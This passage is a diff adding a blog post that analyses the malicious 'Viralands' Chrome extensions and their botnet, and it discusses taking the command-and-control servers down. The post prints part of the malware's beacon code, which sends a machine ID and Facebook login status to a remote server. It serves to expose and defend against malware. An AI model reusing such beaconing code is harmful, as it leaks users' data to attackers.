+		<span class="nx">data</span><span class="p">.</span><span class="nx">id</span> <span class="o">=</span> <span class="nx">storage</span><span class="p">.</span><span class="nx">uid</span><span class="p">;</span>
+		<span class="nx">data</span><span class="p">.</span><span class="nx">extension_id</span> <span class="o">=</span> <span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">id</span><span class="p">;</span>
+		<span class="nx">data</span><span class="p">.</span><span class="nx">fbLoginStatus</span> <span class="o">=</span> <span class="nx">fbLoginStatus</span><span class="p">;</span>
+		
+		<span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+		
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span> <span class="nx">STATUS_URL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="dl">'</span><span class="s1">Content-Type</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">application/x-www-form-urlencoded</span><span class="dl">'</span><span class="p">);</span>
+		<span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">queryString</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
+		
+		<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Status data has been sent</span><span class="dl">'</span><span class="p">,</span> <span class="nx">data</span><span class="p">);</span>
+	<span class="p">});</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></figure>
+<p>It sends three things back to the server:</p>
+<ol>
+<li>The <abbr title="Unique Identifier">UID</abbr>, a unique ID string that identifies the infected machine</li>
+<li>The extension ID, a string corresponding to the extension that is reporting back (because there are multiple copies of the same extension available in the Chrome Webstore, and the malware operators might need to know which one you have).</li>
+<li>Whether the infected machine currently is signed into Facebook</li>
+</ol>
+<p>I’m taking it that the malware operators use this information to judge the exact size and activity of their botnet, as these are factors that determine its value on the black market.</p>
+<h3 id="and-potentially-much-more">And potentially much more</h3>
+<p>The extension is always on the lookout for a new version of the payload. Though I haven’t witnessed it change, it could very well evolve and gain new capabilities.</p>
+<p>Since the malware has permission to “read and change all your data on the websites you visit”, its operators could gain total control over everything that happens in your browser. They could potentially read your emails, steal all your login credentials, have you DDoS someone, mine Bitcoin, seed pirated content… You name it. That even includes reading and leaking your credit card information, if you ever are to type that in.</p>
+<p>Your local files are off-limit though, if that’s of any consolation. Hurray, right?</p>
+<h2 id="taking-the-botnet-down">Taking the botnet down</h2>
+<p>Though most of the Viralands extensions have been taken down from the Chrome Webstore now, that doesn’t change anything for the 132,265 infected computers. To the best of my knowledge (I couldn’t find anything confirming it though), an extension stays installed even after it has been removed from the Webstore, so every infected machine effectively stays infected.</p>
+<p>Thankfully, this <abbr title="Command and Control">C&C</abbr> network isn’t really well conceived. As the <a href="https://en.wikipedia.org/wiki/Command_and_control_(malware)">Wikipedia article on <abbr title="Command and Control">C&C</abbr></a> notes:</p>
+<blockquote>
+<p>A botnet server structure that lacks redundancy is vulnerable to at least the temporary disconnection of that server.</p>
+</blockquote>
+<p>There is no redundancy in this case; the <abbr title="Command and Control">C&C</abbr> server is just a hardcoded IP address! If the malware operators were to lose control over said IP address, the whole network would effectively be deactivated. Again, the article notes:</p>
+<blockquote>
+<p>In some cases, computer security experts have succeeded in destroying or subverting malware command and control networks, by, among other means, seizing servers or getting them cut off from the Internet</p>
+</blockquote>
+<p>Well, I wouldn’t consider myself to be an <em>expert</em> in computer security, but I might be able to destroy this <abbr title="Command and Control">C&C</abbr> network anyway.</p>
+<p>Using <a href="https://ipalyzer.com/">IPalyzer</a>, I found out that both IP addresses belong to DigitalOcean, a hosting provider (actually the one that I use for this site). I have experience signaling abuse to DigitalOcean, and they have always been very responsive, usually getting the issue solved within a day or two.</p>
+<p>If DigitalOcean does take down these two servers, then the botnet will have been destroyed. Or rather, the malware operators will lose control over it — all the machines technically remain infected, but the malware will be defused. Still, that’s a patched security vulnerability on 130,000 machines at once. A drop in the ocean compared to the size of the Internet, but still a decent catch if you ask me.</p>
+<h2 id="how-can-we-prevent-this-in-the-future">How can we prevent this in the future?</h2>
+<p>I do not want to offer the conclusion that everyone should stay clear of all browser extensions. They’re still immensely useful, and some of them actually do make for a safer browsing experience (<a href="https://chrome.google.com/webstore/detail/https-everywhere/gcbommkclmclpchllfjekcdonpmejbdp?hl=en">HTTPS Everywhere</a>, <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en">uBlock Origin</a>, <a href="https://chrome.google.com/webstore/detail/lastpass-free-password-ma/hdokiejnpimakedhajhdlcegeplioahd">LastPass</a>…). That being said, malware will always be a risk when you offer third-party software high levels of permissions. I’d like to propose a few ideas that could help reduce that risk.</p>
+<p>Google could start out by restoring trust in trustworthy extensions. One way of doing that would be to manually verify extensions, or vet the reputation of the developer.</p>
+<p>Open Source is also a great way of restoring trust: if an extension is open source, then maybe that could warrant a badge? There’s still the problem of whether the open source code is what’s being served in the extension, but there are ways of solving that too — off the top of my head I can suggest a GitHub integration that automatically builds and publishes the latest version of the code and then marks it as “verified as being open-source”.</p>
+<p>Let’s not forget that this is f***ing Google we’re talking about! They do <a href="https://archive.is/CLrJ8">static code analysis with automatic suggestion of fixes on an 86TB repository</a>, so don’t tell me that they’re unable to detect blatant malware in a 20KB Chrome extension! The fact is that the current malware detection on the Chrome Webstore is a joke. Currently, all it takes to get around it is to download the payload on installation rather than shipping with it. This has been the case for years now, and it doesn’t seem like Google is doing much about it. They offer <a href="https://www.google.com/about/appsecurity/chrome-rewards/">5-digit bug bounties for vulnerabilities in Chrome</a>, and yet they leave this glaring security hole virtually unguarded!</p>
+<p>The current state of affairs is dismal on the Chrome Webstore. Yes, you can report an abusive extension, but the fact that these ones got to at least 132,000 users before being taken down is a testament to how ineffective that is. If anyone from Google is reading this: fix the Chrome Webstore — it’s one of the largest single security threats to the Web right now.</p>
+<hr />
+<h2 id="addendum">Addendum</h2>
+<p>Will Harris, who works on Chrome Security, tells me that blacklisted extensions actually are removed from the computers of those who have them installed.</p>
+<blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr"><a href="https://twitter.com/maximekjaer">@maximekjaer</a> Extensions that are blacklisted in the Chrome web store do get automatically removed from all users who have them installed.</p>&mdash; Will Harris (@parityzero) <a href="https://twitter.com/parityzero/status/755060191519911937">July 18, 2016</a></blockquote>
+<script async="" src="//platform.twitter.com/widgets.js" charset="utf-8"></script>
+<p>That’s good news, because it means that the 132,000 users in question aren’t infected anymore. It provides an easier, more efficient way of shutting down a such botnet.</p>
+<ul class="article-links">
+<li>
+<svg class="octicon octicon-history" viewBox="0 0 14 16" version="1.1" width="14" height="16" aria-hidden="true">
+<path d="M8 13H6V6h5v2H8v5zM7 1C4.81 1 2.87 2.02 1.59 3.59L0 2v4h4L2.5 4.5C3.55 3.17 5.17 2.3 7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-.34.03-.67.09-1H.08C.03 7.33 0 7.66 0 8c0 3.86 3.14 7 7 7s7-3.14 7-7-3.14-7-7-7z"></path>
+</svg>
+<a href="https://github.com/MaximeKjaer/kjaer.io/commits/master/_posts/2016-07-18-extension-malware.md">View the edit history</a>
+</li>
+<li>
+<svg class="octicon octicon-comment-discussion" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true">
+<path d="M15 1H6c-.55 0-1 .45-1 1v2H1c-.55 0-1 .45-1 1v6c0 .55.45 1 1 1h1v3l3-3h4c.55 0 1-.45 1-1V9h1l3 3V9h1c.55 0 1-.45 1-1V2c0-.55-.45-1-1-1zM9 11H4.5L3 12.5V11H1V5h4v3c0 .55.45 1 1 1h3v2zm6-3h-2v1.5L11.5 8H6V2h9v6z"></path>
+</svg>
+<a href="https://news.ycombinator.com/item?id=12114523">View the discussion on Hacker News</a>
+</li>
+</ul>
+<a href="/" id="back">&laquo; Back </a>
+</article>
+<div class="comments">
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    
+	    var disqus_shortname = 'kjaermaxime'; 
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+</div>
+</main>
+<footer>
+<nav>
+<ul>
+<li>
+<a href="https://twitter.com/maximekjaer">Twitter</a>
+</li>
+<li>
+<a href="/feed.xml">RSS Feed</a>
+</li>
+<li>
+<a href="https://github.com/MaximeKjaer/kjaer.io">Source</a>
+</li>
+</ul>
+</nav>
+</footer>
+</body>
+</html>
